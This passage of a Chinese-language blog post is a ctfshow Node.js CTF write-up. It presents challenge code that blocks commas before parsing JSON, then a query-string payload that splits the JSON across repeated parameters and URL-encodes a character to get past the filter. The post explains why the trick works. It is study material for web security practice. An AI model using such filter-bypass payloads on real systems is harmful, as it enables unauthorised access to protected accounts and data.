<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag = <span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">url</span>.<span class="title function_">match</span>(<span class="regexp">/8c|2c|\,/ig</span>))&#123;</span><br><span class="line">  	res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> query = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">query</span>.<span class="property">query</span>);</span><br><span class="line">  <span class="keyword">if</span>(query.<span class="property">name</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;query.<span class="property">password</span>===<span class="string">&#x27;ctfshow&#x27;</span>&amp;&amp;query.<span class="property">isVIP</span>===<span class="literal">true</span>)&#123;</span><br><span class="line">  	res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  	res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag. :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>req.query.queryè¿™ä¸ªä»£ç è·å–åˆ°è¯·æ±‚å¤´çš„è¯·æ±‚å‚æ•°çš„queryï¼Œä¹Ÿå°±æ˜¯getä¼ å‚queryã€‚ä¸€å¼€å§‹æˆ‘ä»¥ä¸ºå°±æ˜¯å‘é€ä¸ªjsonæ•°æ®å³å¯ï¼Œä½†æ˜¯å‘ç°é€—å·è¢«è¿‡æ»¤äº†ã€‚æˆ‘å°±æ²¡è§è¿‡Jsonæ•°æ®ä¸ç”¨é€—å·éš”å¼€çš„</p>
<p>è™½ç„¶jsonæ•°æ®åœ¨URLä¼ è¾“çš„æ—¶å€™ä¼šè¢«ç¼–ç ï¼Œä½†æ˜¯æŠŠ<code>%2c</code>ä¹Ÿç»™è¿‡æ»¤äº†</p>
<p>åªèƒ½å»çœ‹å¤§ä½¬çš„payload</p>
<div class="code-container" code-lang="Json"><div class="codebox"><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?query=<span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span>&amp;query=<span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;%63tfshow&quot;</span>&amp;query=<span class="attr">&quot;isVIP&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>é¦–å…ˆå°±æ˜¯node.jså¤„ç†req.query.queryçš„æ—¶å€™ï¼Œå®ƒä¸åƒphpé‚£æ ·ï¼Œåé¢getä¼ çš„queryå€¼ä¼šè¦†ç›–å‰é¢çš„ï¼Œè€Œæ˜¯ä¼šæŠŠè¿™äº›å€¼éƒ½æ”¾è¿›ä¸€ä¸ªæ•°ç»„ä¸­ã€‚è€ŒJSON.parseå±…ç„¶ä¼šæŠŠæ•°ç»„ä¸­çš„å­—ç¬¦ä¸²éƒ½æ‹¼æ¥åˆ°ä¸€èµ·ï¼Œå†çœ‹æ»¡ä¸æ»¡è¶³æ ¼å¼ï¼Œæ»¡è¶³å°±è¿›è¡Œè§£æï¼Œå› æ­¤è¿™æ ·åˆ†å¼€æ¥ä¼ å°±å¯ä»¥ç»•è¿‡é€—å·äº†ã€‚è‡³äºcé‚£ä¸ªä¹‹æ‰€ä»¥è¦å†è¿›è¡Œurlç¼–ç æˆ%63,å°±æ˜¯å› ä¸ºå‰é¢çš„%22ï¼Œä¼šé€ æˆ%22cï¼Œæ­£å¥½banäº†2cï¼Œæ‰€ä»¥cä¹Ÿéœ€è¦è¿›è¡Œurlç¼–ç ã€‚å­¦åˆ°äº†å­¦åˆ°äº†ï¼Œå¾ˆæœ‰æ„æ€çš„ç‰¹æ€§ã€‚</p>
<div class="code-container" code-lang="Javascript"><div class="codebox"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">query</span>);<span class="comment">//çœ‹æ¥æ˜¯ä¼šå°†ä¼ å‚æ‹¼æ¥èµ·æ¥</span></span><br><span class="line">  <span class="comment">// è¾“å‡º: &#123; query: [ &#x27;&#123;&quot;name&quot;:&quot;admin&quot;&#x27;, &#x27;&quot;password&quot;:&quot;ctfshow&quot;&#x27;, &#x27;&quot;isVIP&quot;:true&#125;&#x27; ] &#125;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// queryæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå› ä¸ºåŒåå‚æ•°å‡ºç°äº†å¤šæ¬¡</span></span><br><span class="line">  <span class="keyword">const</span> queryArray = req.<span class="property">query</span>.<span class="property">query</span>;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(queryArray[<span class="number">0</span>]); <span class="comment">// &#x27;&#123;&quot;name&quot;:&quot;admin&quot;&#x27;</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(queryArray[<span class="number">1</span>]); <span class="comment">// &#x27;&quot;password&quot;:&quot;ctfshow&quot;&#x27;</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(queryArray[<span class="number">2</span>]); <span class="comment">// &#x27;&quot;isVIP&quot;:true&#125;&#x27;</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>



</div><div class="post-reward"><div class="post-reward-btn" title="èµèµä½œè€…"><img src="/assets/images/svg/uc/uc-gift.svg" class="icon noview" alt="Icon"><span></span></div><div class="post-reward-content"><div class="post-reward-text"></div><div class="post-reward-list"><a href="/null" target="_blank">è‡´è°¢åå•</a></div></div></div><div class="post-copyright"><div class="post-copyright-info">æœ¬ä½œå“ç”± Regulus äº 2025-07-02 20:56:09 å‘å¸ƒ</div><div class="post-copyright-link"><span>ä½œå“åœ°å€ï¼š<a href="http://example.com/2025/07/02/ctfshow-nodejs/">ctfshow_nodejs</a></span><button class="copy-text" type="button" data-text="http://example.com/2025/07/02/ctfshow-nodejs/">å¤åˆ¶</button></div><div class="post-copyright-detail">é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œæœ¬ç«™ä½œå“å‡é‡‡ç”¨ <a href='https://creativecommons.org/licenses/by-nc-sa/4.0/' title='Attribution-NonCommercial-ShareAlike' target='_blank'>CC BY-NC-SA 4.0</a> è®¸å¯åè®®ï¼Œè½¬è½½è¯·æ³¨æ˜æ¥è‡ª <a href='/'>Meiçš„å°çª</a></div><img class="post-copyright-icon noview" src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></div><div class="post-tail-tags"><a class="post-tail-tags-link" href="/tags/js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">jsä»£ç å®¡è®¡</a><a class="post-tail-tags-link" href="/tags/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" rel="tag">jsåŸå‹é“¾æ±¡æŸ“</a><a class="post-tail-tags-link" href="/tags/js%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">jså‘½ä»¤æ‰§è¡Œ</a></div></div><aside id="post-sidebar" status="show"><div id="toc-container"><div class="toc-title"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"><span>ç›®å½•</span></div><div class="toc-content" id="toc-div"><ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#ctfshow-nodejs"><span class="toc-list-text">ctfshow_nodejs</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-list-text">å‰è¨€</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#web334"><span class="toc-list-text">web334</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#web335"><span class="toc-list-text">web335</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8F"><span class="toc-list-text">å‘½ä»¤æ‰§è¡Œæ–¹å¼</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#web336"><span class="toc-list-text">web336</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#web337"><span class="toc-list-text">web337</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#web338"><span class="toc-list-text">web338</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#web339"><span class="toc-list-text">web339</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#web340"><span class="toc-list-text">web340</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#web341"><span class="toc-list-text">web341</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#web342"><span class="toc-list-text">web342</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#web344"><span class="toc-list-text">web344</span></a></li></ol></li></ol></div></div></aside></div></div><div id="toolbar" hide=""><div id="toolbar-setting-container" hide=""><div class="toolbar-item"><button id="tool-color-mode" title="æ·±è‰²æ¨¡å¼" type="button"><img src="/assets/images/svg/ta/ta-moon.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button class="copy-text" id="tool-share" title="åˆ†äº«" type="button" data-text="http://example.com/2025/07/02/ctfshow-nodejs/"><img src="/assets/images/svg/ta/ta-share.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-plus" title="æ”¾å¤§å­—ä½“" type="button"><img src="/assets/images/svg/ta/ta-text-plus.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-minus" title="ç¼©å°å­—ä½“" type="button"><img src="/assets/images/svg/ta/ta-text-minus.svg" class="icon noview" alt="Icon"></button></div></div><div class="toolbar-container"><div class="toolbar-item"><button id="tool-setting" title="è®¾ç½®" type="button"><img src="/assets/images/svg/ta/ta-setting.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-toc" title="ç›®å½•" type="button"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-gototop" title="è¿”å›é¡¶éƒ¨" type="button"><img src="/assets/images/svg/ta/ta-up.svg" class="icon noview" alt="Icon"></button></div></div></div><div class="search-overlay"><div class="search-container"><div class="search-header"><div class="search-title"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" /><path d="M21 21l-6 -6" /></svg>
æœç´¢</div><div class="search-close-btn"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 21a9 9 0 0 0 9 -9a9 9 0 0 0 -9 -9a9 9 0 0 0 -9 9a9 9 0 0 0 9 9z" /><path d="M9 8l6 8" /><path d="M15 8l-6 8" /></svg></div></div><div class="search-input-box"><input id="search-input" type="search" placeholder="è¯·è¾“å…¥å…³é”®è¯è¿›è¡Œç«™å†…æœç´¢â€¦â€¦" value="" maxlength="80"/></div><div class="search-result-container"><div class="search-result-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" /><path d="M21 21l-6 -6" /></svg></div></div></div></div></main><footer><div class="footer"><div id="footer-copyright">Â© 2024 - 2026 <span>ğŸ’—</span> <a href="/null">Regulus</a></div><div id="footer-info"><div id="footer-framework">ğŸš€æœ¬ç«™ç”± <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/chanwj/hexo-theme-meow" title="3.2.0" target="_blank">Meow</a> å¼ºåŠ›é©±åŠ¨</div><div id="footer-runtime"><span id="runtime" data-startdate="2024-04-02T22:16:20.000Z">ğŸŒ»å·²ç¨³å®šè¿è¡Œ.å¹´.æœˆ.å¤©</span></div></div><div id="footer-statistic"><span>å…±æ’°å†™168ç¯‡æ–‡ç« ï¼Œå…¨ç«™å…±460.2kå­—</span></div><div id="footer-pageview"><div id="container_site_pv"><span>ğŸ”¥æ€»è®¿é—®é‡</span><span id="vercount_value_site_pv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"  stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 6l0 -3" /><path d="M16.25 7.75l2.15 -2.15" /><path d="M18 12l3 0" /><path d="M16.25 16.25l2.15 2.15" /><path d="M12 18l0 3" /><path d="M7.75 16.25l-2.15 2.15" /><path d="M6 12l-3 0" /><path d="M7.75 7.75l-2.15 -2.15" /></svg></span></div><div id="container_site_uv"><span>ğŸˆè®¿å®¢äººæ•°</span><span id="vercount_value_site_uv"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"  stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 6l0 -3" /><path d="M16.25 7.75l2.15 -2.15" /><path d="M18 12l3 0" /><path d="M16.25 16.25l2.15 2.15" /><path d="M12 18l0 3" /><path d="M7.75 16.25l-2.15 2.15" /><path d="M6 12l-3 0" /><path d="M7.75 7.75l-2.15 -2.15" /></svg></span></div></div></div></footer><div class="scripts"><script>const GLOBALCONFIG = {
  root: '/',
  toolbar: true,
  lazyload_src: '/assets/images/Meow-Loading.webp',
  friends: false,
  codeblock: true,
  share_text: '',
  onblur_title: 'Please Come Backï½âœ§(Â´â–½`Êƒâ™¡Æª)',
  mouse_click: false,
  notify:{
    enable: false,
    info: 'å¤åˆ¶æˆåŠŸï½è½¬è½½è¯·æ ‡æ³¨æœ¬æ–‡åœ°å€',
    f12_info: 'å¼€å‘è€…æ¨¡å¼å·²æ‰“å¼€ï¼Œè¯·éµå¾ªæœ¬ç«™ç‰ˆæƒåè®®'
  },
  search: {
    enable: true,
    path: 'search.json',
    local: {
      top_n_per_article: 1,
      preload: false
    }
  },
  encrypt: false,
};
</script><script>if (!localStorage.getItem('color-mode')) {
  localStorage.setItem('color-mode', 'light' || 'light');
}
document.body.setAttribute('data-mode', localStorage.getItem('color-mode'));
</script>
<script src="/js/theme/tools/utils.js"></script>

<script src="/js/plugins/dist/lazyload.min.js"></script>

<script src="/js/plugins/view-image.min.js"></script>
<script src="https://events.vercount.one/js" defer="defer"></script><script>if (localStorage.getItem('font-size')) {
  document.querySelector('.post').style.fontSize = localStorage.getItem('font-size') + 'px';
}
</script>
<script src="/js/plugins/dist/search.js"></script>

<script src="/js/main.js" type="module"></script>
</div></body></html>